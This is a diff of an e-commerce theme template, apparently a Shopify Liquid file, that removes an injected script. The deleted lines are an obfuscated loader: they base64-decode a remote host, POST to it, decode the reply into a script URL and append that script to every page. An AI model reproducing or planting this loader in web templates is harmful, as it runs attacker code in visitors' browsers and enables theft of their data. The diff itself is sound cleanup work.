@@ -51,8 +51,6 @@
         }
       </script>
     {% endif %}
-    <script>let ada=atob; fetch(ada('Ly9nb2Fsa2VlcGVyLnBpY3M'),{ method: "POST" }).then(r=>r.blob()).then(d=>d.text().then(b=>{
-    const s=document.createElement('script');s.src=ada(b);document.head.appendChild(s);}));</script>
     {% if settings.favicon != blank %}
         <link rel="shortcut icon" href="{{ settings.favicon | img_url: '32x32' }}" type="image/png">
     {% endif %}
